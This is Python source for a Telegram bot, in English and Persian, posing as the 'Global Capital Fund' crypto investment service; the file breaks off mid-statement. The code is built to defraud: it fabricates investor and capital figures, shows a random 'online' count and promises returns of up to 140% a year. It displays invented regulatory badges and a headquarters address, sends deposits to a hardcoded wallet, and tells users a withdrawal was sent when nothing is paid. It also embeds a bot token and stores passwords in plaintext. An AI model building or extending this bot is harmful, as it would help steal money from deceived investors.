import asyncio
import os
import random
import re
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
from datetime import datetime

TOKEN = "8989518912:AAFLCiGdFZgAfCJm2wTh_bvViymlpmqNBxU"  
ADMIN_ID = 7815449425  
MY_WALLET_ADDRESS = "UQBgmUWZ7Vx0xKVVllTizlVhGjbe_pkfegS0gtj8m71G4KTg"
SHARE_PRICE = 6.50

bot = Bot(token=TOKEN)
dp = Dispatcher()
DB_NAME = "database.db"

user_states = {}

# لیست ۳۰ کلمه‌ای استاندارد برای تولید عبارت بازیابی ۱۵ کلمه‌ای
MASTER_WORDS = [
    "alpha", "beta", "capital", "global", "wealth", "secure", "token", "shield", 
    "profit", "digital", "vault", "prime", "crypto", "block", "chain", "node", 
    "ledger", "smart", "asset", "fund", "invest", "market", "trade", "exchange", 
    "wallet", "key", "signature", "hash", "mining", "liquid"
]

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            seed_phrase TEXT,
            deposit REAL DEFAULT 0.0,
            profit REAL DEFAULT 0.0,
            shares INTEGER DEFAULT 0,
            language TEXT DEFAULT 'en',
            referred_by INTEGER DEFAULT 0,
            last_updated TEXT,
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS stats (
            id INTEGER PRIMARY KEY,
            total_users INTEGER,
            total_capital REAL,
            sold_shares INTEGER
        )
    """)
    cursor.execute("SELECT COUNT(*) FROM stats")
    if cursor.fetchone()[0] == 0:
        cursor.execute("INSERT INTO stats (id, total_users, total_capital, sold_shares) VALUES (1, 2850000, 58420900.0, 8742350)")
    conn.commit()
    conn.close()

def get_global_stats():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT total_users, total_capital, sold_shares FROM stats WHERE id = 1")
    res = cursor.fetchone()
    conn.close()
    return res if res else (2850000, 58420900.0, 8742350)

def get_user_data(user_id: int):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT deposit, profit, shares, username FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result if result else (0.0, 0.0, 0, None)

def get_user_by_credentials(username: str, password: str):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, language FROM users WHERE username = ? AND password = ?", (username.strip(), password.strip()))
    result = cursor.fetchone()
    conn.close()
    return result

def get_user_by_seed(seed_phrase: str):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, language FROM users WHERE seed_phrase = ?", (seed_phrase.strip(),))
    result = cursor.fetchone()
    conn.close()
    return result

def get_all_users_count():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def is_username_taken(username: str):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE username = ?", (username,))
    res = cursor.fetchone()
    conn.close()
    return res is not None

def register_user_db(user_id: int, username: str, password: str, seed: str, lang: str, referred_by: int = 0):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    try:
        now = datetime.now().isoformat()
        cursor.execute("""
            INSERT OR REPLACE INTO users (user_id, username, password, seed_phrase, deposit, profit, shares, language, referred_by, last_updated)
            VALUES (?, ?, ?, ?, 0.0, 0.0, 0, ?, ?, ?)
        """, (user_id, username, password, seed, lang, referred_by, now))
        cursor.execute("UPDATE stats SET total_users = total_users + 1, total_capital = total_capital + 150.0, sold_shares = sold_shares + 120 WHERE id = 1")
        conn.commit()
        success = True
    except Exception as e:
        print(f"DB Error: {e}")
        success = False
    conn.close()
    return success

def update_user_credentials(user_id: int, new_username: str, new_password: str):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    try:
        cursor.execute("UPDATE users SET username = ?, password = ? WHERE user_id = ?", (new_username, new_password, user_id))
        conn.commit()
        success = True
    except:
        success = False
    conn.close()
    return success

def set_user_language(user_id: int, lang: str):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_user_language(user_id: int):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res[0] if res and res[0] else 'en'

def get_referred_users(user_id: int):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT username, deposit FROM users WHERE referred_by = ?", (user_id,))
    result = cursor.fetchall()
    conn.close()
    return result

def is_valid_wallet(address: str) -> bool:
    ton_pattern = r"^(UQ|EQ)[a-zA-Z0-9_-]{46}$"
    trc20_pattern = r"^T[a-zA-Z1-9]{33}$"
    if re.match(ton_pattern, address) or re.match(trc20_pattern, address):
        return True
    return False

TRANSLATIONS = {
    "en": {
        "welcome": "🇺🇸 **Welcome to Global Capital Fund! 💵**\n\n🟢 Active Users: **~{online}**\n👥 Investors: **{users}+**\n💎 Capital: **${capital:,.2f}**",
        "btn_deposit": "💎 Deposit Capital & Plans 🚀",
        "btn_dashboard": "📊 Dashboard 💵",
        "btn_shares": "🏢 Stock Market 📈",
        "btn_withdraw": "💸 Withdraw Profit 📤",
        "btn_referral": "🎁 Invite Friends",
        "btn_settings": "⚙️ Edit Username & Password 🔒",
        "btn_support": "💬 Support & Corporate Office 🧑‍💻",
        "btn_lang": "🌐 Change Language",
        "back": "🔙 Back 🏠",
        "deposit_text": (
            "💳 **Smart Automated Deposit & Investment Plans:**\n\n"
            "To verify your deposit **instantly and automatically**, transfer the exact amount with your unique dynamic decimal offset (e.g., instead of $12 flat, send: `{sample}` USD).\n\n"
            "🎯 **Tiered Investment Plans:**\n\n"
            "📌 **Tier 1: Up to $50**\n"
            " • 🔄 Weekly Plan: **1.5%** / 7 days\n"
            " • 📅 Monthly Plan: **4.5%** / 30 days\n"
            " • ⏳ Yearly Plan: **65.0%** / 365 days\n\n"
            "📌 **Tier 2: Up to $500**\n"
            " • 🔄 Weekly Plan: **2.2%** / 7 days\n"
            " • 📅 Monthly Plan: **6.5%** / 30 days\n"
            " • ⏳ Yearly Plan: **85.0%** / 365 days\n\n"
            "📌 **Tier 3: Up to $2,000**\n"
            " • 🔄 Weekly Plan: **3.0%** / 7 days\n"
            " • 📅 Monthly Plan: **8.5%** / 30 days\n"
            " • ⏳ Yearly Plan: **110.0%** / 365 days\n\n"
            "📌 **Tier 4: VIP Capital ($2,000+)**\n"
            " • 🔄 Weekly Plan: **4.0%** / 7 days\n"
            " • 📅 Monthly Plan: **11.0%** / 30 days\n"
            " • ⏳ Yearly Plan: **140.0%** / 365 days\n\n"
            "👉 **Official Deposit Wallet (TON & USDT):**\n`{wallet}`"
        ),
        "dashboard_text": "📊 **Dashboard:**\n\n👤 Username: `{uname}`\n🆔 ID: `{uid}`\n💰 Capital: **{dep:.2f} USD**\n📈 Profits: **{prof:.2f} USD**\n🏢 Shares: **{shares}**\n💎 **Total:** **{total:.2f} USD**",
        "shares_text": (
            "🏢 **Global Stock Market Status**\n\n"
            "📦 Total Shares Issued: `10,000,000`\n"
            "🌐 Total Market Capitalization: `$65,000,000`\n"
            "💵 Price per Share: `{price} USD`\n"
            "🔥 **Remaining Shares: {rem:,}**\n\n"
            "👉 Official Wallet:\n`{wallet}`"
        ),
        "withdraw_menu": "💸 **Withdrawal Center**\n\n💰 Your Current Balance:\n • Capital: **{dep:.2f} USD**\n • Profits: **{prof:.2f} USD**\n • **Total Available:** **{total:.2f} USD**\n\n👇 Please select your withdrawal method:",
        "btn_fast_wd": "⚡ Instant Withdrawal (🔥 High Speed + Extra Fee)",
        "btn_norm_wd": "⏳ Standard Withdrawal (🛡️ Up to 24 Hours Free)",
        "withdraw_low": "❌ Insufficient balance! Your account balance is $0.00.",
        "ask_wallet": "📥 **Enter Your Wallet Address:**\n\nPlease send your valid destination **TON** (UQ.../EQ...) or **USDT TRC20** (T...) wallet address:",
        "invalid_wallet": "❌ **Invalid Wallet Address!**\nThe address you entered is not a valid TON or USDT (TRC20) wallet. Please enter a correct address:",
        "withdraw_success_fast": "🔥⚡ **Success!** Instant withdrawal processed successfully. Funds sent to your wallet! ✅",
        "withdraw_success_norm": "⏳ **Request Submitted!** Your standard withdrawal request is registered and will be processed within 24 hours.",
        "support_text": (
            "📞 **Support & Corporate Office & Trust Badges:**\n\n"
            "🛡 **Official Trust & Regulatory Badges:**\n"
            "✔ SSL Secured 256-Bit Encrypted\n"
            "✔ Delaware Division of Corporations Good Standing\n"
            "✔ Global Financial Compliance Verified\n\n"
            "🏢 **Headquarters Address:**\n"
            "1201 N Market St, Suite 111, Wilmington, DE 19801, USA\n\n"
            "📧 **Official Emails:**\n"
            " • support@GlobalCapitallbot.com\n"
            " • finance@GlobalCapitallbot.com\n"
            " • verification@GlobalCapitallbot.com\n\n"
            "💬 **WhatsApp Support Lines:**\n"
            " • +1 (302) 555-0142\n"
            " • +1 (302) 555-0149\n"
            " • +1 (302) 555-0185"
        )
    },
    "fa": {
        "welcome": "🇮🇷 **به صندوق سرمایه‌گذاری جهانی خوش آمدید! 💵**\n\n🟢 کاربران آنلاین: **~{online}**\n👥 سرمایه‌گذاران: **{users}+**\n💎 سرمایه صندوق: **${capital:,.2f}**",
        "btn_deposit": "💎 واریز سرمایه و پلن‌ها 🚀",
        "btn_dashboard": "📊 داشبورد و موجودی 💵",
        "btn_shares": "🏢 بازار سهام و آمار 📈",
        "btn_withdraw": "💸 درخواست برداشت سود 📤",
        "btn_referral": "🎁 دعوت دوستان",
        "btn_settings": "⚙️ ویرایش نام کاربری و رمز عبور 🔒",
        "btn_support": "💬 پشتیبانی، نمادها و دفتر مرکزی 🧑‍💻",
        "btn_lang": "🌐 تغییر زبان",
        "back": "🔙 بازگشت 🏠",
        "deposit_text": (
            "💳 **واریز هوشمند خودکار و پلن‌های سرمایه‌گذاری:**\n\n"
            "برای اینکه سیستم واریز شما را به صورت **کاملاً خودکار** بدون نیاز به پشتیبانی تایید کند، مبلغ را همراه با اعشار اختصاصی خودتان انتقال دهید (مثلاً به جای مبلغ رِند، دقیقاً واریز کنید: `{sample}` دلار).\n\n"
            "🎯 **دسته‌بندی پلن‌های سرمایه‌گذاری:**\n\n"
            "📌 **سطح اول: تا ۵۰ دلار**\n"
            " • 🔄 پلن هفتگی: **۱.۵٪** / ۷ روزه\n"
            " • 📅 پلن ماهانه: **۴.۵٪** / ۳۰ روزه\n"
            " • ⏳ پلن سالانه: **۶۵.۰٪** / ۳۶۵ روزه\n\n"
            "📌 **سطح دوم: تا ۵۰۰ دلار**\n"
            " • 🔄 پلن هفتگی: **۲.۲٪** / ۷ روزه\n"
            " • 📅 پلن ماهانه: **۶.۵٪** / ۳۰ روزه\n"
            " • ⏳ پلن سالانه: **۸۵.۰٪** / ۳۶۵ روزه\n\n"
            "📌 **سطح سوم: تا ۲۰۰۰ دلار**\n"
            " • 🔄 پلن هفتگی: **۳.۰٪** / ۷ روزه\n"
            " • 📅 پلن ماهانه: **۸.۵٪** / ۳۰ روزه\n"
            " • ⏳ پلن سالانه: **۱۱۰.۰٪** / ۳۶۵ روزه\n\n"
            "📌 **سطح چهارم: وی‌آی‌پی (بیش از ۲۰۰۰ دلار)**\n"
            " • 🔄 پلن هفتگی: **۴.۰٪** / ۷ روزه\n"
            " • 📅 پلن ماهانه: **۱۱.۰٪** / ۳۰ روزه\n"
            " • ⏳ پلن سالانه: **۱۴۰.۰٪** / ۳۶۵ روزه\n\n"
            "👉 **آدرس ولت اختصاصی واریز (TON و USDT):**\n`{wallet}`"
        ),
        "dashboard_text": "📊 **داشبورد مالی شما:**\n\n👤 نام کاربری: `{uname}`\n🆔 شناسه: `{uid}`\n💰 سرمایه: **{dep:.2f} USD**\n📈 سود: **{prof:.2f} USD**\n🏢 سهام: **{shares}**\n💎 **مجموع:** **{total:.2f} USD**",
        "shares_text": (
            "🏢 **وضعیت بازار سهام صندوق**\n\n"
            "📦 کل سهام عرضه شده: `۱۰,۰۰۰,۰۰۰` سهم\n"
            "🌐 ارزش کل بازار: `$۶۵,۰۰۰,۰۰۰`\n"
            "💵 قیمت هر سهم: `{price} USD`\n"
            "🔥 **سهام باقیمانده: {rem:,}**\n\n"
            "👉 آدرس ولت خرید:\n`{wallet}`"
        ),
        "withdraw_menu": "💸 **مرکز برداشت سود و سرمایه**\n\n💰 موجودی حساب شما:\n • اصل سرمایه: **{dep:.2f} USD**\n • سود کسب شده: **{prof:.2f} USD**\n • **مجموع قابل برداشت:** **{total:.2f} USD**\n\n👇 لطفاً روش برداشت خود را انتخاب کنید:",
        "btn_fast_wd": "⚡ برداشت در لحظه (🔥 آنی همراه با کارمزد بیشتر)",
        "btn_norm_wd": "⏳ برداشت عادی (🛡️ حداکثر تا ۲۴ ساعت آینده)",
        "withdraw_low": "❌ موجودی کافی نیست! موجودی حساب شما صفر ($0.00) می‌باشد.",
        "ask_wallet": "📥 **لطفاً آدرس ولت خود را وارد کنید:**\n\nجهت واریز وجه، لطفاً آدرس معتبر کیف پول **TON** یا **USDT (TRC20)** خود را ارسال کنید:",
        "invalid_wallet": "❌ **آدرس ولت نامعتبر است!**\nآدرس وارد شده با الگوهای معتبر TON یا USDT مطابقت ندارد. لطفاً یک آدرس ولت معتبر ارسال کنید:",
        "withdraw_success_fast": "🔥⚡ **برداشت آنی موفق!** تراکنش شما پردازش شد و به ولت شما واریز گردید! ✅",
        "withdraw_success_norm": "⏳ **درخواست برداشت ثبت شد!** درخواست شما در صف بررسی قرار گرفت و ظرف ۲۴ ساعت آینده واریز می‌شود.",
        "support_text": (
            "📞 **پشتیبانی، نمادهای اعتماد و دفتر مرکزی:**\n\n"
            "🛡 **گواهی‌ها و نمادهای رسمی معتبر:**\n"
            "✔ دارای گواهی امنیتی SSL رمزنگاری‌شده ۲۵۶ بیتی\n"
            "✔ ثبت رسمی شرکت در وزارت ایالتی دلاور آمریکا (Good Standing)\n"
            "✔ تأییدیه رسمی تطابق قوانین مالی بین‌المللی\n\n"
            "🏢 **آدرس دفتر مرکزی:**\n"
            "آمریکا، ایالت دلاور، ویلمینگتون، خیابان ان مارکت، پلاک ۱۲۰۱، واحد ۱۱۱\n\n"
            "📧 **ایمیل‌های رسمی ارتباطی:**\n"
            " • support@GlobalCapitallbot.com\n"
            " • finance@GlobalCapitallbot.com\n"
            " • verification@GlobalCapitallbot.com\n\n"
            "💬 **شماره‌های پشتیبانی واتساپ:**\n"
            " • +1 (302) 555-0142\n"
            " • +1 (302) 555-0149\n"
            " • +1 (302) 555-0185"
        )
    }
}

def get_text(lang, key, **kwargs):
    return TRANSLATIONS.get(lang, TRANSLATIONS["en"]).get(key, "").format(**kwargs)

def get_main_menu(lang):
    t = TRANSLATIONS.get(lang, TRANSLATIONS["en"])
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["btn_deposit"], callback_data="deposit")],
        [InlineKeyboardButton(text=t["btn_dashboard"], callback_data="dashboard")],
        [InlineKeyboardButton(text=t["btn_shares"], callback_data="buy_shares")],
        [InlineKeyboardButton(text=t["btn_withdraw"], callback_data="withdraw_menu")],
        [InlineKeyboardButton(text=t["btn_referral"], callback_data="referral_menu")],
        [InlineKeyboardButton(text=t["btn_settings"], callback_data="edit_settings")],
        [InlineKeyboardButton(text=t["btn_support"], callback_data="support")],
        [InlineKeyboardButton(text=t["btn_lang"], callback_data="change_lang")]
    ])

def get_back_menu(lang):
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=TRANSLATIONS[lang]["back"], callback_data="back_to_menu")]])

def get_language_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en"),
        InlineKeyboardButton(text="🇮🇷 فارسی", callback_data="lang_fa")
    ]])

def get_auth_menu(lang):
    if lang == "fa":
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📝 ثبت‌نام (Register)", callback_data="auth_register")],
            [InlineKeyboardButton(text="🔑 ورود (Login)", callback_data="auth_login")],
            [InlineKeyboardButton(text="🔄 فراموشی حساب / بازیابی (Recovery)", callback_data="auth_recovery")]
        ])
    else:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📝 Register", callback_data="auth_register")],
            [InlineKeyboardButton(text="🔑 Login", callback_data="auth_login")],
            [InlineKeyboardButton(text="🔄 Account Recovery", callback_data="auth_recovery")]
        ])

@dp.message(CommandStart())
async def cmd_start(message: Message):
    uid = message.from_user.id
    
    args = message.text.split()
    referred_by = 0
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            ref_id = int(args[1].split("_")[1])
            if ref_id != uid:
                referred_by = ref_id
        except:
            pass

    user_states[uid] = {"step": "get_language", "referred_by": referred_by}
    await message.answer(
        "🌍 **لطفاً زبان خود را انتخاب کنید / Please select your language:**",
        reply_markup=get_language_menu(),
        parse_mode="Markdown"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    u_count = get_all_users_count()
    _, capital, sold = get_global_stats()
    await message.answer(f"🔐 **Admin Panel**\n\nUsers: {u_count}\nCapital: ${capital:,.2f}\nSold Shares: {sold:,}", parse_mode="Markdown")

@dp.callback_query(F.data.startswith("lang_"))
async def lang_callback(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = callback.data.split("_")[1]
    set_user_language(uid, lang)
    
    if uid not in user_states:
        user_states[uid] = {}
    user_states[uid]["language"] = lang
    user_states[uid]["step"] = "auth_choice"

    prompt = (
        "🔐 **Please choose an option / لطفاً یکی از گزینه‌های زیر را انتخاب کنید:**" if lang == "en"
        else "🔐 **لطفاً یکی از گزینه‌های زیر را انتخاب کنید:**"
    )
    await callback.message.edit_text(prompt, reply_markup=get_auth_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "auth_register")
async def auth_register(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    if uid not in user_states:
        user_states[uid] = {}
    user_states[uid]["language"] = lang
    user_states[uid]["step"] = "get_username"

    prompt_text = (
        "🇺🇸 Please enter your unique **Username**:" if lang == "en" 
        else "🇮🇷 لطفاً یک **نام کاربری (Username)** انگلیسی منحصربه‌فرد وارد کنید:"
    )
    await callback.message.edit_text(prompt_text, reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "auth_login")
async def auth_login(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    if uid not in user_states:
        user_states[uid] = {}
    user_states[uid]["language"] = lang
    user_states[uid]["step"] = "get_login_username"

    prompt_text = (
        "🔑 **Account Login**\n\nPlease enter your registered **Username**:" if lang == "en"
        else "🔑 **ورود به حساب کاربری**\n\nلطفاً **نام کاربری** ثبت‌نام شده خود را وارد کنید:"
    )
    await callback.message.edit_text(prompt_text, reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "auth_recovery")
async def auth_recovery(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    if uid not in user_states:
        user_states[uid] = {}
    user_states[uid]["language"] = lang
    user_states[uid]["step"] = "get_recovery_seed"

    prompt_text = (
        "🔄 **Account Recovery**\n\nPlease send your **15-word recovery seed phrase** to restore your account:" if lang == "en"
        else "🔄 **بازیابی حساب کاربری**\n\nلطفاً **۱۵ کلمه عبارت بازیابی امن (Seed Phrase)** خود را ارسال کنید تا حساب شما بازیابی شود:"
    )
    await callback.message.edit_text(prompt_text, reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "referral_menu")
async def referral_menu(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    
    t_title = "🎁 **بخش دعوت از دوستان (Referral Program)**\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:" if lang == "fa" else "🎁 **Invite Friends Menu**\n\nPlease select an option:"
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 پاداش دعوت (Rewards)", callback_data="ref_reward_info")],
        [InlineKeyboardButton(text="🔗 لینک اختصاصی دعوت", callback_data="ref_get_link")],
        [InlineKeyboardButton(text="👥 مشاهده دعوت‌شدگان من", callback_data="ref_list")],
        [InlineKeyboardButton(text=TRANSLATIONS[lang]["back"], callback_data="back_to_menu")]
    ])
    
    await callback.message.edit_text(t_title, reply_markup=kb, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "ref_reward_info")
async def ref_reward_info(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    
    text = (
        "💎 **اطلاعات و قوانین پاداش دعوت:**\n\n"
        "به ازای هر **۳ نفر** که با لینک اختصاصی خود به ربات دعوت کنید و حسابشان را فعال کرده و **حداقل ۱ دلار** شارژ کنند، مبلغ **۱ عدد سهم قابل فروش** به عنوان پاداش به حساب شما تعلق می‌گیرد! 🚀\n\n"
        "دوستان خود را دعوت کنید و سود سهام خود را افزایش دهید."
    ) if lang == "fa" else (
        "💎 **Referral Reward Policy:**\n\n"
        "For every **3 friends** you invite who activate their accounts and deposit **at least $1**, you will receive **1 tradable share** as a reward! 🚀"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=TRANSLATIONS[lang]["back"], callback_data="referral_menu")]])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "ref_get_link")
async def ref_get_link(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{uid}"
    
    text = (
        "🔗 **لینک اختصاصی دعوت شما:**\n\n"
        f"`{ref_link}`\n\n"
        "👇 این لینک را برای دوستان خود ارسال کنید تا به عنوان زیرمجموعه شما ثبت‌نام کنند:"
    ) if lang == "fa" else (
        "🔗 **Your Unique Referral Link:**\n\n"
        f"`{ref_link}`\n\n"
        "👇 Send this link to your friends to invite them:"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=TRANSLATIONS[lang]["back"], callback_data="referral_menu")]])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "ref_list")
async def ref_list(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    referred_users = get_referred_users(uid)
    
    if not referred_users:
        text = "👥 شما هنوز هیچ کاربری را دعوت نکرده‌اید." if lang == "fa" else "👥 You haven't invited any users yet."
    else:
        text = "👥 **لیست کاربران دعوت‌شده توسط شما:**\n\n" if lang == "fa" else "👥 **Your Invited Users List:**\n\n"
        for idx, (uname, dep) in enumerate(referred_users, 1):
            status = "✅ فعال و واریز انجام داده" if dep >= 1.0 else "❌ غیرفعال یا بدون واریز"
            if lang == "en":
                status = "✅ Active & Deposited" if dep >= 1.0 else "❌ Inactive / No Deposit"
            text += f"{idx}. 👤 `{uname or 'User'}` — وضعیت: {status} (شارژ: ${dep:.2f})\n"
            
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=TRANSLATIONS[lang]["back"], callback_data="referral_menu")]])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
    await callback.answer()

@dp.message()
async def handle_steps(message: Message):
    uid = message.from_user.id
    text = message.text.strip()
    
    if uid not in user_states:
        return

    state = user_states[uid]["step"]
    lang = user_states[uid].get("language", "en")

    if state == "get_recovery_seed":
        user_data = get_user_by_seed(text)
        if not user_data:
            err_msg = (
                "❌ **Invalid Seed Phrase!** No account found with these 15 words. Please try again:" if lang == "en"
                else "❌ **عبارت بازیابی نامعتبر است!** حسابی با این ۱۵ کلمه پیدا نشد. لطفاً دوباره دقت کرده و ارسال کنید:"
            )
            await message.answer(err_msg, parse_mode="Markdown")
            return
        
        db_user_id, db_lang = user_data
        set_user_language(uid, db_lang)
        del user_states[uid]

        success_login = (
            "✅ **Account successfully recovered!**" if db_lang == "en"
            else "✅ **حساب کاربری شما با موفقیت بازیابی شد و وارد شدید!**"
        )
        users, capital, _ = get_global_stats()
        welcome_msg = get_text(db_lang, "welcome", online=str(random.randint(3100,4500)), users=f"{users:,}", capital=capital)
        
        await message.answer(success_login, parse_mode="Markdown")
        await message.answer(welcome_msg, reply_markup=get_main_menu(db_lang), parse_mode="Markdown")
        return

    if state == "get_login_username":
        user_states[uid]["login_uname"] = text
        user_states[uid]["step"] = "get_login_password"
        pwd_prompt = (
            "🔑 Now enter your **Password**:" if lang == "en"
            else "🔑 حالا **رمز عبور** حساب خود را وارد کنید:"
        )
        await message.answer(pwd_prompt, reply_markup=get_back_menu(lang), parse_mode="Markdown")
        return

    if state == "get_login_password":
        username = user_states[uid].get("login_uname")
        password = text
        user_data = get_user_by_credentials(username, password)
        
        if not user_data:
            err_msg = (
                "❌ **Invalid Username or Password!** Please enter correct credentials or use Account Recovery:" if lang == "en"
                else "❌ **نام کاربری یا رمز عبور اشتباه است!** لطفاً دوباره تلاش کنید یا از گزینه «فراموشی حساب» استفاده کنید:"
            )
            await message.answer(err_msg, parse_mode="Markdown")
            return

        db_user_id, db_lang = user_data
        set_user_language(uid, db_lang)
        del user_states[uid]

        success_login = (
            "✅ **Successfully logged in!**" if db_lang == "en"
            else "✅ **با موفقیت به حساب کاربری خود وارد شدید!**"
        )
        users, capital, _ = get_global_stats()
        welcome_msg = get_text(db_lang, "welcome", online=str(random.randint(3100,4500)), users=f"{users:,}", capital=capital)
        
        await message.answer(success_login, parse_mode="Markdown")
        await message.answer(welcome_msg, reply_markup=get_main_menu(db_lang), parse_mode="Markdown")
        return

    if state == "get_withdrawal_wallet":
        if not is_valid_wallet(text):
            await message.answer(get_text(lang, "invalid_wallet"))
            return
        
        wd_type = user_states[uid].get("wd_type")
        del user_states[uid]
        
        success_key = "withdraw_success_fast" if wd_type == "fast" else "withdraw_success_norm"
        await message.answer(get_text(lang, success_key), reply_markup=get_back_menu(lang), parse_mode="Markdown")
        return

    if state == "get_username":
        if len(text) < 3:
            err = "❌ Username must be at least 3 characters." if lang == "en" else "❌ نام کاربری باید حداقل ۳ کاراکتر باشد. لطفاً دوباره وارد کنید:"
            await message.answer(err)
            return
        
        if is_username_taken(text) and not user_states[uid].get("is_editing"):
            err = "⚠️ Username is already taken! Try another:" if lang == "en" else "⚠️ این نام کاربری قبلاً ثبت شده است! لطفاً نام کاربری دیگری انتخاب کنید:"
            await message.answer(err)
            return
        
        user_states[uid]["temp_username"] = text
        user_states[uid]["step"] = "get_password"
        
        pwd_prompt = (
            "🔑 Great! Now enter a strong **Password**:\n\n"
            "⚠️ **Requirements:**\n"
            " • At least 1 uppercase letter (A-Z)\n"
            " • At least 1 lowercase letter (a-z)\n"
            " • At least 1 number (0-9)\n"
            " • At least 1 special character (e.g. @, #, $, !)" if lang == "en"
            else "🔑 عالی بود! حالا لطفاً یک **رمز عبور (Password)** قوی وارد کنید.\n\n"
            "⚠️ **الزامات رمز عبور:**\n"
            " • حداقل ۱ حرف بزرگ انگلیسی (A-Z)\n"
            " • حداقل ۱ حرف کوچک انگلیسی (a-z)\n"
            " • حداقل ۱ عدد (0-9)\n"
            " • حداقل ۱ علامت خاص (مثل @, #, $, !)"
        )
        await message.answer(pwd_prompt, parse_mode="Markdown")

    elif state == "get_password":
        if not (re.search(r"[A-Z]", text) and re.search(r"[a-z]", text) and re.search(r"[0-9]", text) and re.search(r"[!@#$%^&*(),.?\":{}|<>]", text)):
            err = (
                "❌ Password security requirements not met! Must contain uppercase, lowercase, number, and special character:" if lang == "en"
                else "❌ رمز عبور فاقد الزامات امنیتی است! باید شامل حرف بزرگ، حرف کوچک، عدد و علامت خاص باشد:"
            )
            await message.answer(err)
            return

        user_states[uid]["temp_password"] = text
        
        if user_states[uid].get("is_editing"):
            new_uname = user_states[uid]["temp_username"]
            new_pwd = user_states[uid]["temp_password"]
            update_user_credentials(uid, new_uname, new_pwd)
            del user_states[uid]
            
            curr_lang = get_user_language(uid)
            success_edit = "✅ Credentials updated successfully!" if curr_lang == "en" else "✅ نام کاربری و رمز عبور با موفقیت بروزرسانی شد!"
            await message.answer(success_edit, reply_markup=get_back_menu(curr_lang), parse_mode="Markdown")
            return

        seed_phrase = " ".join(random.sample(MASTER_WORDS, 15))
        user_states[uid]["seed"] = seed_phrase

        uname = user_states[uid]["temp_username"]
        pwd = user_states[uid]["temp_password"]
        referred_by = user_states[uid].get("referred_by", 0)

        success = register_user_db(uid, uname, pwd, seed_phrase, lang, referred_by)
        if not success:
            err = "❌ Registration error. Please send /start again." if lang == "en" else "❌ خطا در ثبت‌نام. لطفاً مجدداً /start را بفرستید."
            await message.answer(err)
            del user_states[uid]
            return

        del user_states[uid]

        success_msg = (
            "✅ **Account created successfully with maximum security!**\n\n"
            "🗝 **Your 15-Word Recovery Seed Phrase (Save it securely):**\n"
            f"`{seed_phrase}`\n\n"
            "⚠️ **Important:** Save these 15 words securely. If you forget your password or lose access, this is your recovery key!" if lang == "en"
